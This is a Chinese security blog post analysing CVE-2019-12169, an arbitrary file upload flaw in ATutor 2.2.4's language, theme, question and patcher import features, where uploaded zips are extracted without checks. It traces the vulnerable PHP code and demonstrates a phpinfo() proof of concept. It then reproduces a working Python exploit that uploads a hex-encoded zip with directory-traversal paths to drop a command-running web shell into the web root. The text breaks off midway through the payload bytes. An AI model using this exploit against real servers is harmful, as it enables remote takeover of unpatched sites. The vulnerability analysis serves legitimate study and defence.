<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞一、漏洞简介ATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS）。该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、Moddle及Sakai号称为四大开源课程管理系统。 ATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)。攻击者可">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/ATutor/%EF%BC%88CVE-2019-12169%EF%BC%89ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞一、漏洞简介ATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS）。该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、Moddle及Sakai号称为四大开源课程管理系统。 ATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)。攻击者可">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId24.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId26.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId32.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId33.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId34.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId35.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId36.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId37.png">
<meta property="article:published_time" content="2022-07-08T06:25:53.361Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId24.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-ATutor/（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/ATutor/%EF%BC%88CVE-2019-12169%EF%BC%89ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:53.361Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-12169）ATutor学习内容管理系统-任意文件上传漏洞"><a href="#（CVE-2019-12169）ATutor学习内容管理系统-任意文件上传漏洞" class="headerlink" title="（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞"></a>（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS）。该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、<br>Moddle及Sakai号称为四大开源课程管理系统。</p>
<p>ATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)。攻击者可利用该漏洞进行远程代码执行攻击。</p>
<p>经过分析发现，除了CVE-2019-1216所报道的语言导入功能外，ATutor在其他功能模块中也大量存在着相似的漏洞，本文会在后面针对这一点进行介绍。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ATutor 2.2.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>据漏洞披露可知，漏洞触发点存在于<code>mods/_core/languages/language_import.php</code>文件中</p>
<p>首先跟入language_import.php文件</p>
<pre><code>PHP
&lt;?php
/****************************************************************/
/* ATutor                                         */
/****************************************************************/
/* Copyright (c) 2002-2010                                      */
/* Inclusive Design Institute                                   */
/* http://atutor.ca                                     */
/*                                                              */
/* This program is free software. You can redistribute it and/or*/
/* modify it under the terms of the GNU General Public License  */
/* as published by the Free Software Foundation.            */
/****************************************************************/
// $Id$

define(&#39;AT_INCLUDE_PATH&#39;, &#39;../../../include/&#39;);
require(AT_INCLUDE_PATH.&#39;vitals.inc.php&#39;);
admin_authenticate(AT_ADMIN_PRIV_LANGUAGES);

require_once(AT_INCLUDE_PATH.&#39;classes/pclzip.lib.php&#39;);
require_once(AT_INCLUDE_PATH.&#39;../mods/_core/languages/classes/LanguageEditor.class.php&#39;);
require_once(AT_INCLUDE_PATH.&#39;../mods/_core/languages/classes/LanguagesParser.class.php&#39;);

/* to avoid timing out on large files */
@set_time_limit(0);

$_SESSION[&#39;done&#39;] = 1;

if (isset($_POST[&#39;submit_import&#39;]))&#123;
    require_once(AT_INCLUDE_PATH.&#39;../mods/_core/languages/classes/RemoteLanguageManager.class.php&#39;);
    $remoteLanguageManager = new RemoteLanguageManager();
    $language_code = explode(&quot;_&quot;,$_POST[&#39;language&#39;]);
    $remoteLanguageManager-&gt;import($_POST[&#39;language&#39;]);
    header(&#39;Location: language_import.php&#39;);
    exit;
&#125; else if (isset($_POST[&#39;submit&#39;]) &amp;&amp; (!is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]) || !$_FILES[&#39;file&#39;][&#39;size&#39;])) &#123;
    $msg-&gt;addError(&#39;LANG_IMPORT_FAILED&#39;);
&#125; else if (isset($_POST[&#39;submit&#39;]) &amp;&amp; !$_FILES[&#39;file&#39;][&#39;name&#39;]) &#123;
    $msg-&gt;addError(&#39;IMPORTFILE_EMPTY&#39;);
&#125; else if (isset($_POST[&#39;submit&#39;]) &amp;&amp; is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) &#123;
    $languageManager-&gt;import($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
    header(&#39;Location: ./language_import.php&#39;);
    exit;
&#125;
</code></pre>
<p>从language_import.php文件中35行起，可以发现文件上传相关代码</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
<p>从上图红框中代码可知，此处代码块是对文件上传情况进行校验</p>
<p>在文件成功上传后，进入下一个if分支</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"></p>
<p>在这个分支里，程序将调用$languageManager-&gt;import方法对文件进行处理</p>
<p>继续跟入import方法，位于<code>/mods/_core/languages/classes/LanguageManager.class.php</code>文件中</p>
<pre><code>PHP
// public
// import language pack from specified file
function import($filename) &#123;
    global $languageManager, $msg;

    if(strstr($_FILES[&#39;file&#39;][&#39;name&#39;], &#39;master&#39;))&#123;
        // hack to create path to subdir for imported github language packs
        $import_dir = str_replace(&quot;.zip&quot;, &quot;&quot;, $_FILES[&#39;file&#39;][&#39;name&#39;]).&#39;/&#39;;
    &#125; else if(isset($_POST[&#39;language&#39;]))&#123;
        $import_dir = $_POST[&#39;language&#39;].&#39;-master/&#39;;
    &#125;
    require_once(AT_INCLUDE_PATH.&#39;classes/pclzip.lib.php&#39;);
    require_once(AT_INCLUDE_PATH.&#39;../mods/_core/languages/classes/LanguagesParser.class.php&#39;);

    $import_path = AT_CONTENT_DIR . &#39;import/&#39;;
    $import_path_tmp = $import_path.$import_dir;
    $language_xml = @file_get_contents($import_path.&#39;language.xml&#39;);
    $archive = new PclZip($filename);

    if ($archive-&gt;extract(   PCLZIP_OPT_PATH,    $import_path) == 0) &#123;
        exit(&#39;Error : &#39; . $archive-&gt;errorInfo(true));
    &#125;
</code></pre>
<p>在import方法中程序调用PclZip对压缩包进行处理</p>
<pre><code>PHP
$archive = new PclZip($filename);

if ($archive-&gt;extract(   PCLZIP_OPT_PATH,    $import_path) == 0) &#123;
    exit(&#39;Error : &#39; . $archive-&gt;errorInfo(true));
&#125;
</code></pre>
<p>为了更好的理解import方法的执行流程，我们将会进行动态调试。首先构造一个poc.php</p>
<pre><code>PHP
&lt;?php phpinfo(); ?&gt;
</code></pre>
<p>将这个poc.php打包为poc.zip</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png"></p>
<p>访问如下链接以进入上传页面</p>
<p><code>https://www.0-sec.org/ATutor/mods/_core/languages/language_import.php</code></p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="4.png"></p>
<p>在上传语言包页面中选择构造好的poc.zip并点击import按钮上传。当请求发送给后台服务器，程序执行到下图断点处</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="5.png"></p>
<p>此时的$import_path值为atutor应用的/content/import路径：”content/import/“，程序调用PclZip的extract方法对压缩包进行解压。接下来我们介绍以下PclZip类</p>
<p><strong>PclZip</strong></p>
<p>PclZip是一个强大的压缩与解压缩zip文件的PHP类，PclZip<br>library不仅能够压缩与解压缩Zip格式的文件；还能解压缩文档中的内容，同时也可以对现有的ZIP包进行添加或删除文件。</p>
<p>我们接下来看下import方法中是如何使用PclZip，见下图</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId29.png" alt="6.png"></p>
<p>程序创建了上传的zip压缩包的一个PclZip对象进行操作与控制，在解压过程中使用了extract方法。该方法中第一个参数是设置项，第二个是对应设置项的值</p>
<p>我们来看下PCLZIP_OPT_PATH设置项的作用</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="7.png"></p>
<p>可见，PCLZIP_OPT_PATH设置项指定我们上传的zip文件解压目录为$import_path参数对应的路径</p>
<p>解压成功后，poc.zip中内容出现在对应文件夹中</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId31.png" alt="8.png"></p>
<p>查看poc.php中的值，可以发现poc上传成功</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId32.png" alt="9.png"></p>
<p>访问如下地址，触发poc</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId33.png" alt="10.png"></p>
<p>除此之外，该应用几乎所有import接口，在后台都采用PclZip将上传的zip解压到对应目录中。然而这些操作无一例外的未对压缩包中的文件进行校验。下面举几个例子：</p>
<p>位于<code>mods/_core/themes/import.php</code>文件中的主题导入功能,代码如下:</p>
<pre><code>PHP
/**
* Imports a theme from a URL or Zip file to Atutor
* @access  private
* @author  Shozub Qureshi
*/
function import_theme() &#123;
    global $db;
    global $msg;
    
    if (isset($_POST[&#39;url&#39;]) &amp;&amp; ($_POST[&#39;url&#39;] != &#39;http://&#39;) ) &#123;
        if ($content = @file_get_contents($_POST[&#39;url&#39;])) &#123;
    
    ⋮
        
    // unzip file and save into directory in themes
    $archive = new PclZip($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
    
    //extract contents to importpath/foldrname
    if (!$archive-&gt;extract($import_path)) &#123;
        $errors = array(&#39;IMPORT_ERROR_IN_ZIP&#39;, $archive-&gt;errorInfo(true));
        clr_dir($import_path);
        $msg-&gt;addError($errors);
        header(&#39;Location: index.php&#39;); 
        exit;
    &#125;
</code></pre>
<p>可以发现这里也使用了extract方法将上传文件进行解压</p>
<p>来看一下导入主题功能对应的前端页面</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId34.png" alt="11.png"></p>
<p>这里页面与导入语音包的页面极其相似，只不过最终解压后存放的路径不同，不再是content/import/，而是themes/</p>
<p>在此处上传构造好的poc.zip，最终poc.php将会被解压到themes文件夹中</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId35.png" alt="12.png"></p>
<p>位于<code>/mods/_standard/tests/question_import.php</code>文件的问题导入功能</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId36.png" alt="13.png"></p>
<p>位于<code>mods/_standard/patcher/index_admin.php</code>文件的补丁导入功能</p>
<p><img src="/resource/(CVE-2019-12169)ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId37.png" alt="14.png"></p>
<p>这些功能无一例外的存在着相似的漏洞</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
<p>CVE-2019-12169.py</p>
</blockquote>
<pre><code>#!/usr/bin/env python
#
# Exploit Title: ATutor 2.2.4 &#39;language_import&#39; Arbitrary File Upload / RCE [CVE-2019-12169]
# Date: 5/24/19
# Exploit Author: liquidsky (JMcPeters)
# Vendor Homepage: https://atutor.github.io/
# Software Link: https://sourceforge.net/projects/atutor/files/latest/download
# Version: 2.2.4
# Tested on: Windows 8 / Apache / MySQL (XAMPP)
# CVE : CVE-2019-12169
# Author Site: http://incidentsecurity.com/atutor-2-2-4-language_import-arbitrary-file-upload-rce/
#            : https://github.com/fuzzlove
#
# Description: ATutor 2.2.4 allows Arbitrary File Upload and Directory Traversal
# resulting in remote code execution via a &quot;..&quot; pathname in a ZIP archive to the mods/_core/languages/language_import.php (aka Import New Language) or mods/_standard/patcher/index_admin.php (aka Patcher) component.
#
# Greetz: wetw0rk, offsec ^^
#
# Notes: This application is no longer being maintained so there is no fix for this issue.

import sys, hashlib, requests
import urllib
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
import time


print &quot;+-------------------------------------------------------------+&quot;
print
print &quot;- ATutor 2.2.4 Arbitrary File Upload / RCE [CVE-2019-12169]&quot;
print
print &quot;-          Discovery / PoC by liquidsky (JMcPeters) ^^&quot;
print
print &quot;+-------------------------------------------------------------+&quot;

try:
#settings
    target   = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    commands = sys.argv[4]

except IndexError:

        print
    print &quot;- usage: %s &lt;target&gt; &lt;username&gt; &lt;password&gt; &lt;command&gt;&quot; % sys.argv[0]
    print &quot;- Example: %s incidentsecurity.com admin mypassword &#39;whoami&#39;&quot; % sys.argv[0]
        print
    sys.exit()


# headers to upload zip
headers = &#123;
    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
    &quot;Referer&quot;: &quot;http://&quot; + target + &quot;/ATutor/mods/_core/languages/language_import.php&quot;,
    &quot;Connection&quot;: &quot;close&quot;,
    &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------CVE201912169&quot;,
&#125;

# Note: This was successfully tested against a windows install however it should work with linux.
# -----
# This will drop a shell on c:\xampp\htdocs\liquidsky.php and or /var/www/html/liquidsky.php
# using directory traversal.


# php file payload
data = &quot;&quot;
data += &quot;\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d&quot;
data += &quot;\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43&quot;
data += &quot;\x56\x45\x32\x30\x31\x39\x31\x32\x31\x36\x39\x0d\x0a\x43\x6f&quot;
data += &quot;\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69&quot;
data += &quot;\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20&quot;
data += &quot;\x6e\x61\x6d\x65\x3d\x22\x66\x69\x6c\x65\x22\x3b\x20\x66\x69&quot;
data += &quot;\x6c\x65\x6e\x61\x6d\x65\x3d\x22\x70\x6f\x63\x2e\x7a\x69\x70&quot;
data += &quot;\x22\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65&quot;
data += &quot;\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x7a&quot;
data += &quot;\x69\x70\x0d\x0a\x0d\x0a\x50\x4b\x03\x04\x14\x00\x00\x00\x08&quot;
data += &quot;\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00\x6a\x00&quot;
data += &quot;\x00\x00\x2c\x00\x00\x00\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x5c&quot;
data += &quot;\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x2f\x78\x61\x6d\x70\x70\x5c&quot;
data += &quot;\x68\x74\x64\x6f\x63\x73\x5c\x6c\x69\x71\x75\x69\x64\x73\x6b&quot;
data += &quot;\x79\x2e\x70\x68\x70\xb3\xb1\x2f\xc8\x28\x50\x48\x2d\x4b\xcc&quot;
data += &quot;\xd1\x50\xb2\xb7\x53\xd2\x4b\x4a\x2c\x4e\x35\x33\x89\x4f\x49&quot;
data += &quot;\x4d\xce\x4f\x49\xd5\x50\x72\x09\xcc\xf7\x02\x62\x8b\x00\x63&quot;
data += &quot;\xa7\xfc\x64\x67\xa7\x9c\x48\xa3\x8c\x32\x4f\x0f\xa7\x8c\x64&quot;
data += &quot;\x63\x3f\x83\x44\x0f\x2f\x43\x6f\xe7\xa0\xb4\x20\x83\xb0\xd0&quot;
data += &quot;\xf0\xca\x94\xe2\xc8\x70\xd3\xbc\x94\x70\xb7\xbc\xa8\xe0\x94&quot;
data += &quot;\x14\xef\x90\xe2\xf4\x80\x2a\x13\x3f\xe7\x74\x5b\x5b\x25\x4d&quot;
data += &quot;\x4d\x6b\x05\x7b\x3b\x00\x50\x4b\x03\x04\x14\x00\x00\x00\x08&quot;
data += &quot;\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00\x6a\x00&quot;
data += &quot;\x00\x00\x2c\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f&quot;
data += &quot;\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77\x77&quot;
data += &quot;\x77\x2f\x68\x74\x6d\x6c\x2f\x6c\x69\x71\x75\x69\x64\x73\x6b&quot;
data += &quot;\x79\x2e\x70\x68\x70\xb3\xb1\x2f\xc8\x28\x50\x48\x2d\x4b\xcc&quot;
data += &quot;\xd1\x50\xb2\xb7\x53\xd2\x4b\x4a\x2c\x4e\x35\x33\x89\x4f\x49&quot;
data += &quot;\x4d\xce\x4f\x49\xd5\x50\x72\x09\xcc\xf7\x02\x62\x8b\x00\x63&quot;
data += &quot;\xa7\xfc\x64\x67\xa7\x9c\x48\xa3\x8c\x32\x4f\x0f\xa7\x8c\x64&quot;
data += &quot;\x63\x3f\x83\x44\x0f\x2f\x43\x6f\xe7\xa0\xb4\x20\x83\xb0\xd0&quot;
data += &quot;\xf0\xca\x94\xe2\xc8\x70\xd3\xbc\x94\x70\xb7\xbc\xa8\xe0\x94&quot;
